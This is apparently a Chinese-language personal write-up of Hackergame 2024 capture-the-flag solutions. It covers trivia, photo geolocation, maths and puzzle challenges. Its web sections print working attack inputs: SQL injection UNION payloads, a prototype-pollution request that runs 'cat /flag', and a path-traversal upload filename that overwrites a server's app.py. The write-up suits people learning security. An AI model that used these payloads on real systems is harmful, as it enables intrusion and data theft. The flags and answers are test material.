当前分数：2950，总排名：160 / 2460

AI：0 ， binary：0 ， general：1000 ， math：850 ， web：1100 



❌：表示此题**未解出**



## 签到

> Hackergame 哦 Hackergame 哦 Hackergame
>
> 有了你生活美好没烦恼

马上启动！

发现跳转到 http://202.38.93.141:12024/?pass=false

修改 false 为 true

http://202.38.93.141:12024/?pass=true



## 喜欢做签到的 CTFer 你们好呀

在比赛首页 - 承办单位处找到 [中国科学技术大学 NEBULA 战队（USTC NEBULA）](https://www.nebuu.la/)

```bash
ls -la
cat .flag
```

获得第二个 flag



`help` 查看有哪些 command 可用

```bash
Welcome! Here are all the available commands:

=========== Available Commands ===============

about awards banner bing cat cd echo
email env github help ls members nvim
readme repo sudo sumfetch vi whoami 

==============================================
```

一个个试到 `env`

```bash
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

获得第一个 flag



## 猫咪问答（Hackergame 十周年纪念版）

1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？**（30 分）**

```
3A204
```

搜索 `2015 中国科学技术大学第二届信息安全大赛时间`，得到 https://lug.ustc.edu.cn/wiki/sec/contest.html?do=export_raw

> 10 月 17 日 周六晚上 19:30 3A204 网络攻防技巧讲座



2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？**（30 分）**

```
2682
```

| 时间 | 题目数量 | 注册人数  | 参考链接                                                     |
| ---- | -------- | --------- | ------------------------------------------------------------ |
| 2019 | 28       | 2682      | https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/        |
| 2020 | 31       | 3733      | https://lug.ustc.edu.cn/news/2020/12/hackergame-2020/        |
| 2021 | 31       | 4023      | https://lug.ustc.edu.cn/news/2021/11/hackergame-2021/        |
| 2022 | 33       | 超过 4500 | https://lug.ustc.edu.cn/news/2023/03/hackergame-award-ceremony/ |
| 2023 | 29       | 超过 4100 | https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/        |



3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？**（20 分）**

```
程序员的自我修养
```

参考当年猫咪问答 第四题

>在中国科大图书馆中，有一本书叫做《程序员的自我修养:链接、装载与库》，请问它的索书号是？
>
>打开[中国科大图书馆主页](https://lib.ustc.edu.cn/)，直接搜索“程序员的自我修养”即可。



4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

```
336
```

https://www.usenix.org/conference/usenixsecurity24/technical-sessions 搜索 `University of Science and Technology of China`，找到对应论文 [FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)

~~读论文这种事情，交给 AI~~



5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？**（5 分）**

```
6e90b6
```

https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2



6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？**（5 分）**

```
1833
```

huggingface 上申请一直在 PENDING，只能爆破了

（2024/11/09 注：依旧 PENDING）



## 打不开的盒

询问 AI 得到如下介绍

> .STL（Stereolithography）文件是一种常用的三维模型文件格式，主要用于3D打印。
>
> ......
>
> www.viewstl.com 在线查看和编辑STL文件

从 “2024” 的 “0” 中可以看到 flag



## 每日论文太多了！

https://dl.acm.org/doi/10.1145/3650212.3652145

下载 PDF 后全文搜索 flag

在 Figure 4 处找到 `flag here`，注意到此处的神秘边框

使用 Acrobat 移除掉上面的白色遮盖后即可看到 flag



## 比大小王

控制台运行如下代码：

```javascript
for (let i = 0; i < state.values.length; i++) {
    const [value1, value2] = state.values[i];
    const input = value1 < value2 ? '<' : '>';
    state.inputs.push(input)
}
state.inputs
submit(state.inputs)
```

交的不对会提示 `检测到异常提交`

交得太快会提示 `检测到时空穿越，挑战失败！`



## 旅行照片 4.0

1. 照片拍摄的位置距离中科大的哪个校门更近？（格式：`X校区Y门`，均为一个汉字）
2. 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：`YYYYMMDD`）

```
东校区西门
20240519
```

地图搜索 `科大硅谷 科里科气科创驿站`，并通过街景比对

https://map.baidu.com/poi/%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)/@13054831,3720055,21z,87t,55.23h#panoid=0901050012220925094354214AI&panotype=street&heading=304.77&pitch=5.8&l=21&tn=B_NORMAL_MAP&sc=0&newmap=1&shareurl=1&pid=0901050012220925094354214AI&psp=%7B%22PanoModule%22%3A%7B%22markerUid%22%3A%22847a2f26f36115f5f33cba4a%22%7D%7D

搜索 `科大 2024 ACG 音乐会`，找到了 [中科大LEO动漫协会的直播间](https://live.bilibili.com/787482)

翻阅动态得到 https://www.bilibili.com/opus/930934582351495204



3. 这个公园的名称是什么？（不需要填写公园所在市区等信息）
4. 这个景观所在的景点的名字是？（三个汉字）

```
中央公园
坛子岭
```

注意到垃圾桶上的六安 搜索 `六安 公园 三色跑道` 得到 中央公园

识图得到 截流石，继续地图搜索得到 坛子岭



5. 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）
6. 左下角的**动车组型号**是？

```
积水潭医院
CRH6F-A
```

注意到题目中的四编组动车以及图片左下角粉红色涂装 搜索 `四编组动车 粉红色` 得到 怀密号 CRH6F-A

注意到图片拍摄的为动车所，结合刚才得到的怀密号可知是北京北，继续地图搜索 `北京北 动车所` 得到 北京积水潭医院(新龙泽院区)



## 不宽的宽字符

假设有一个 wchar_t 类型的字符 '0x1234'

由于是小端序（little-endian），则 `0x1234` 在内存中的表示是 `0x34 0x12`

强制转换成 char 类型，变为两个字符 '0x34' '0x12'



将 `Z:\theflag` 按照如上方法反向转换：

```
Z:\theflag
0x5A 0x3A 0x5C 0x74 0x68 0x65 0x66 0x6C 0x61 0x67

0x3A5A 0x745C 0x6568 0x6C66 0x6761
㩚瑜敨汦条
```

注意到字符串最后被附加了一段 `you_cant_get_the_flag`

因此还需要一个 '0x00' 让字符串提前结束

随便找一个低八位为 0x00 的字即可



payload

```
㩚瑜敨汦条怀
```



## ❌PowerfulShell

可以使用的字符：

```
~`${}[]\|:123456789+-_=
```



构造出了以下字符

```bash
>$$
7
>$-
hB
>$_
input

${-::1} h
${-:1:1} B
${_::1} i
${_:1:1} n
${_:2:1} p
${_:3:1} u
${_:4:1} t
```



## Node.js is Web Scale

查看源码发现需要往 cmds 里加一个 `payload: 'cat /flag'`

但现在只能往 store 里加东西，怎么才能同时加到 cmds 里呢？

诶，`__proto__` 



```
POST /set
{"key":"__proto__.payload","value":"cat /flag"}

GET /execute?cmd=payload
```



## PaoluGPT

### 千里挑一

遍历聊天记录列表 可获得 flag



### 窥视未知

查看源码发现可以SQL注入

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```



构造payload 可获得 flag

```
' OR shown = false AND '1'='1
```



```
' UNION SELECT id, contents FROM messages WHERE contents LIKE '%flag%' LIMIT 1 --
```

```
' UNION SELECT id, contents FROM messages WHERE contents LIKE '%flag%' LIMIT 1,1 --
```



## ℹ强大的正则表达式

### Easy

注意到 2000 = 16 * 125

```
(0|16|32|48|64|80|96|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|((0|1|2|3|4|5|6|7|8|9)*(((2|4|6|8|0)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992))|((1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984))))
```

（801字符）



不过因为一般随机不到0~1000，可以省略这一部分

```
(0|1|2|3|4|5|6|7|8|9)*(((2|4|6|8|0)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992))|((1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984)))
```

（553字符）

[regex101: build, test and debug regex](https://regex101.com/)



### ❌Medium

https://blog.csdn.net/xindoo/article/details/102643270

https://blog.csdn.net/kittyjie/article/details/54907771

先构造 DFA，再由 DFA 推导出正则表达式

~~编 译 原 理~~

怎么八百万字符（



## 惜字如金 3.0

### 题目 A

```python
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```



## 优雅的不等式

### Easy

[知乎 - 【科普】如何优雅地“注意到”关于e、π的不等式](https://zhuanlan.zhihu.com/p/669285539)

注意到 $\int_{0}^{1} \frac{x \left(1-x\right) \left(a+bx+cx^2\right)} {1+x^2} dx = \frac{1}{4}\left(a-b-c\right)\pi+\frac{1}{2}\left(a+b-c\right)\ln2+\left(-a+\frac{1}{2}b+\frac{7}{6}c\right)$

将问题转化为，寻找 $a,b,c$ 满足 $q\pi-p = \frac{1}{4}\left(a-b-c\right)\pi+\frac{1}{2}\left(a+b-c\right)\ln2+\left(-a+\frac{1}{2}b+\frac{7}{6}c\right)$ 使得 $a+bx+cx^2$ 在 $\left[0,1\right]$ 上恒非负



```python
x*(1-x)*(8-2*x+6*x**2)/(1+x*x)		#pi-2
x*(1-x)*(12-6*x+6*x**2)/(1+x*x)/3	#pi-8/3
```



## 关灯

### Easy

暴力求解需要 $2^{27}$ 次，大约 40 分钟

试个几十次总能碰到一次能在 3 分钟内解出来的（



笑点解析：

```
Enter difficulty level (1~4): 1
111101010011110101111111111
Enter your answer: ^C

Connection closed
```



### Medium

解法见 Hard



### Hard

高斯消元法求解异或方程组

```python
import numpy as np

def create_matrix(n):
    size = n ** 3
    matrix = np.zeros((size, size), dtype=int)
    
    for i in range(n):
        for j in range(n):
            for k in range(n):
                index = i * n**2 + j * n + k
                matrix[index, index] = 1
                
                if i > 0:
                    matrix[index, (i-1) * n**2 + j * n + k] = 1
                if i < n-1:
                    matrix[index, (i+1) * n**2 + j * n + k] = 1
                if j > 0:
                    matrix[index, i * n**2 + (j-1) * n + k] = 1
                if j < n-1:
                    matrix[index, i * n**2 + (j+1) * n + k] = 1
                if k > 0:
                    matrix[index, i * n**2 + j * n + (k-1)] = 1
                if k < n-1:
                    matrix[index, i * n**2 + j * n + (k+1)] = 1
                    
    return matrix

def solve_puzzle(matrix, vector):
    n = len(vector)
    
    for i in range(n):
        # 找到主元所在行
        max_row = i
        for j in range(i + 1, n):
            if abs(matrix[j, i]) > abs(matrix[max_row, i]):
                max_row = j
        
        # 交换行
        matrix[[i, max_row]] = matrix[[max_row, i]]
        vector[[i, max_row]] = vector[[max_row, i]]
        
        # 对于每一行，如果主元不是0，就进行消元
        if matrix[i, i] != 0:
            for j in range(i + 1, n):
                if matrix[j, i] != 0:
                    factor = matrix[j, i] / matrix[i, i]
                    matrix[j] ^= int(factor) * matrix[i]
                    vector[j] ^= int(factor) * vector[i]
    
    # 回代求解
    solution = np.zeros(n, dtype=int)
    for i in range(n-1, -1, -1):
        solution[i] = vector[i]
        for j in range(i + 1, n):
            solution[i] ^= matrix[i, j] * solution[j]
    
    return solution

lights_string = input("Enter your puzzle: ").strip()
n = round(len(lights_string) ** (1/3))
lights_array = np.array(list(map(int, lights_string)), dtype=np.uint8).reshape(n, n, n)
vector = lights_array.flatten()

# 创建系数矩阵
matrix = create_matrix(n)

# 使用高斯消元法求解线性方程组
solution_array = solve_puzzle(matrix, vector)
solution_string = "".join(map(str, solution_array.flatten().tolist()))
print("Solution:")
print(solution_string)
```



## 禁止内卷

首先想到根据反馈的平方差，逐个调整每项的值，使得平方差最小

梯 度 下 降

得到 flag 如下

```
flag{unoAAAA_esrever_now_U_run_MY_cAdeAfecAcAcAA}
```

怎么不对呢



查看源码发现 answer 小于 0 时会被赋值为 0，因此这种方法行不通

```python
def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers
```



注意到提示，开了 `--reload`

这意味着当源代码文件发生任何变化时，Flask 服务器会自动重启以应用这些更改

于是可以修改源代码如下：

```python
from flask import Flask, render_template_string
import json
import os

app = Flask(__name__)

JSON_FILE_PATH = 'answers.json'

@app.route('/')
def index():
    # 读取 answers.json 文件
    if os.path.exists(JSON_FILE_PATH):
        with open(JSON_FILE_PATH, 'r') as file:
            answers = json.load(file)
    else:
        answers = {"error": "answers.json not found"}

    # 渲染页面并显示答案
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Answers</title>
        </head>
        <body>
            <h1>Answers</h1>
            <pre>{{ answers | tojson | safe }}</pre>
        </body>
        </html>
    ''', answers=answers)
```

将上传文件名改为 `../web/app.py`

文件名不能包含 `/` ？

可以在 POST 的时候修改

```
Content-Disposition: form-data; name="file"; filename="../web/app.py"
```

刷新页面，这样就能获取到 answers.json 了



## 零知识数独

### 数独高手

做完四个数独得到 flag



## ❌先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」

### ❌「行吧就算标题可以很长但是 flag 一定要短点」

笑点解析：[xxblxs](https://www.quinapalus.com/cgi-bin/qat?pat=[hackergmx][hackergmx]bl[hackergmx]s)

>In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet **ambles**. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
